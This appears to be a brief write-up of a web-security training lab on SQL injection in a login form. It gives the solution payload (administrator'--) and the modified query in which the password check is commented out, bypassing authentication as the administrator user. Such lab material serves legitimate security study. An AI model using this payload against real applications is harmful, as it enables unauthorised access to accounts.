# Subverting application logic

## SQL injection vulnerability allowing login bypass

This lab contains an SQL injection vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.

Solution:

```sql
administrator'--
```

Modified SQL query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'alpha'
```